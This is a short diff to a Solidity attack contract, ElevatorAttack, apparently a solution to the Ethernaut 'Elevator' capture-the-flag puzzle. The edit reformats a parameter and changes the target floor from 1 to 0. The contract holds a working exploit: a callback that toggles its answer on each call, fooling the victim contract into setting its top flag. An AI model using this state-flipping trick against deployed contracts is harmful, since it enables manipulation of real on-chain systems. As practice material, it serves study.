@@ -12,15 +12,17 @@ contract ElevatorAttack {
         victimElevator = victimElevator_;
     }
 
-    function isLastFloor(uint256) external returns (bool isLastFloor_) {
+    function isLastFloor(
+        uint256 /* floor */
+    ) external returns (bool isLastFloor_) {
         isLastFloor_ = _isLastFloor = !_isLastFloor;
     }
 
     function attack() external {
-        victimElevator.goTo(1);
+        victimElevator.goTo(0);
 
         require(
-            victimElevator.top() && 1 == victimElevator.floor(),
+            victimElevator.top() && 0 == victimElevator.floor(),
             "Elevator: Attack failed"
         );
     }
